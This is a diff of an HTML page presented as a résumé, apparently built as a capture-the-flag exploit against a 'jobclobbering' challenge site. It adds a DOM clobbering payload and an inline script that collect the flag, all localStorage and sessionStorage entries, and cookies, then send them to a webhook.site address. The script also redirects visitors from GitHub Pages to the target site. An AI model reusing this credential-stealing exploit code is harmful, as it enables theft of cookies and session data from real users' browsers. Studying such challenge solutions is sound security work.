@@ -12,9 +12,9 @@
     </style>
 </head>
 <body>
-    <!-- DOM Clobbering payload to override window.utilsJS -->
+    <!-- DOM Clobbering payload - 全面扫描版本 -->
     <div id="utilsJS">
-        <div id="url">data:text/javascript,try{console.log('[ATTACK] Malicious script executed!');var flag=localStorage.getItem('flag');console.log('[ATTACK] Flag found:',flag);if(flag){var img=new Image();img.src='https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?flag='+encodeURIComponent(flag)+'&source=jobclobbering_attack&t='+Date.now();console.log('[ATTACK] Flag sent to webhook');}}catch(e){console.error('[ATTACK] Error:',e);}</div>
+        <div id="url">data:text/javascript,try{console.log('[COMPREHENSIVE] Script executing...');function scanStorage(){var data={};data.flag=localStorage.getItem('flag')||'';data.ls={};for(var i=0;i<localStorage.length;i++){var k=localStorage.key(i);data.ls[k]=localStorage.getItem(k);}data.ss={};try{for(var j=0;j<sessionStorage.length;j++){var sk=sessionStorage.key(j);data.ss[sk]=sessionStorage.getItem(sk);}}catch(e){}data.cookies=document.cookie||'';data.domain=window.location.hostname;data.url=window.location.href;return data;}var scanResult=scanStorage();console.log('[COMPREHENSIVE] Scan result:',scanResult);var img=new Image();img.src='https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?flag='+encodeURIComponent(scanResult.flag)+'&ls='+encodeURIComponent(JSON.stringify(scanResult.ls))+'&ss='+encodeURIComponent(JSON.stringify(scanResult.ss))+'&cookies='+encodeURIComponent(scanResult.cookies)+'&domain='+encodeURIComponent(scanResult.domain)+'&source=comprehensive&t='+Date.now();console.log('[COMPREHENSIVE] Data sent');}catch(e){console.error('[COMPREHENSIVE] Error:',e);}</div>
     </div>
 
     <div class="header">
@@ -48,13 +48,6 @@
             <li>Reduced application load time by 40% through optimization</li>
             <li>Mentored junior developers and conducted code reviews</li>
         </ul>
-
-        <h3>Software Engineer - StartupXYZ (2019-2021)</h3>
-        <ul>
-            <li>Built responsive web applications using React and Node.js</li>
-            <li>Implemented CI/CD pipelines reducing deployment time by 60%</li>
-            <li>Collaborated with product team to define technical requirements</li>
-        </ul>
     </div>
 
     <div class="section">
@@ -64,35 +57,109 @@
     </div>
 
     <script>
-        console.log('[INIT] Resume page loaded');
+        console.log('[INIT] Comprehensive attack page loaded');
+        console.log('[INIT] Current domain:', window.location.hostname);
         console.log('[INIT] Current URL:', window.location.href);
+        
+        // 立即扫描当前域名的存储
+        function scanCurrentDomain() {
+            console.log('[SCAN] Scanning current domain storage...');
+            try {
+                const data = {
+                    flag: localStorage.getItem('flag') || '',
+                    ls: {},
+                    ss: {},
+                    cookies: document.cookie || '',
+                    domain: window.location.hostname,
+                    url: window.location.href
+                };
+                
+                // 扫描localStorage
+                for (let i = 0; i < localStorage.length; i++) {
+                    const k = localStorage.key(i);
+                    data.ls[k] = localStorage.getItem(k);
+                    console.log('[SCAN] localStorage:', k, '=', data.ls[k]);
+                }
+                
+                // 扫描sessionStorage
+                try {
+                    for (let j = 0; j < sessionStorage.length; j++) {
+                        const sk = sessionStorage.key(j);
+                        data.ss[sk] = sessionStorage.getItem(sk);
+                        console.log('[SCAN] sessionStorage:', sk, '=', data.ss[sk]);
+                    }
+                } catch (e) {}
+                
+                console.log('[SCAN] cookies:', data.cookies);
+                
+                // 发送扫描结果
+                const img = new Image();
+                img.src = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?flag=' + encodeURIComponent(data.flag) + 
+                         '&ls=' + encodeURIComponent(JSON.stringify(data.ls)) + 
+                         '&ss=' + encodeURIComponent(JSON.stringify(data.ss)) + 
+                         '&cookies=' + encodeURIComponent(data.cookies) + 
+                         '&domain=' + encodeURIComponent(data.domain) + 
+                         '&scan_source=immediate&t=' + Date.now();
+                
+                console.log('[SCAN] Scan result sent');
+                return data;
+            } catch (e) {
+                console.error('[SCAN] Error:', e);
+                return null;
+            }
+        }
+        
+        // 立即扫描
+        const initialScan = scanCurrentDomain();
         
         // 发送页面加载信号
         try {
             const img = new Image();
-            img.src = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?event=resume_loaded&url=' + encodeURIComponent(window.location.href) + '&t=' + Date.now();
-        } catch (e) {
-            console.error('[INIT] Failed to send load signal:', e);
+            img.src = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?event=comprehensive_loaded&domain=' + 
+                     encodeURIComponent(window.location.hostname) + '&t=' + Date.now();
+        } catch (e) {}
+
+        // 如果在GitHub Pages，跳转到目标网站
+        if (window.location.hostname.includes('github.io')) {
+            console.log('[REDIRECT] On GitHub, will redirect to target...');
+            setTimeout(() => {
+                try {
+                    const img = new Image();
+                    img.src = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?event=redirecting_from_github&t=' + Date.now();
+                } catch (e) {}
+                window.location.href = 'https://jobclobbering-fe734e8816c7316e.chal.secjhu.club/#messages';
+            }, 2000);
+        } else {
+            // 在目标网站上，再次扫描并尝试触发DOM Clobbering
+            console.log('[TARGET] On target site, performing additional scans...');
+            
+            // 延迟扫描（等待可能的异步数据加载）
+            setTimeout(() => {
+                console.log('[TARGET] Secondary scan...');
+                scanCurrentDomain();
+            }, 1000);
+            
+            // 尝试触发DOM Clobbering
+            setTimeout(() => {
+                console.log('[TARGET] Attempting to trigger DOM Clobbering...');
+                try {
+                    if (typeof loadMessageBoardJS === 'function') {
+                        console.log('[TARGET] loadMessageBoardJS found, calling...');
+                        loadMessageBoardJS();
+                    } else {
+                        console.log('[TARGET] loadMessageBoardJS not found, trying alternatives...');
+                        if (typeof getMessages === 'function') {
+                            getMessages();
+                        }
+                    }
+                } catch (e) {
+                    console.error('[TARGET] Error triggering:', e);
+                    const img = new Image();
+                    img.src = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?error=trigger_error&msg=' + 
+                             encodeURIComponent(e.message) + '&t=' + Date.now();
+                }
+            }, 3000);
         }
-
-        // 检查DOM clobbering
-        console.log('[INIT] DOM Clobbering check:');
-        console.log('[INIT] window.utilsJS:', window.utilsJS);
-        console.log('[INIT] window.utilsJS.url:', window.utilsJS?.url);
-
-        // 自动跳转到挑战网站的messages页面
-        setTimeout(() => {
-            console.log('[REDIRECT] Redirecting to target site...');
-            
-            // 发送跳转前信号
-            try {
-                const img = new Image();
-                img.src = 'https://webhook.site/00cc1371-1da8-47a4-9a33-da034f7efd2e?event=before_redirect&target=jobclobbering&t=' + Date.now();
-            } catch (e) {}
-            
-            // 跳转到挑战网站的messages页面
-            window.location.href = 'https://jobclobbering-fe734e8816c7316e.chal.secjhu.club/#messages';
-        }, 2000);
     </script>
 </body>
 </html>
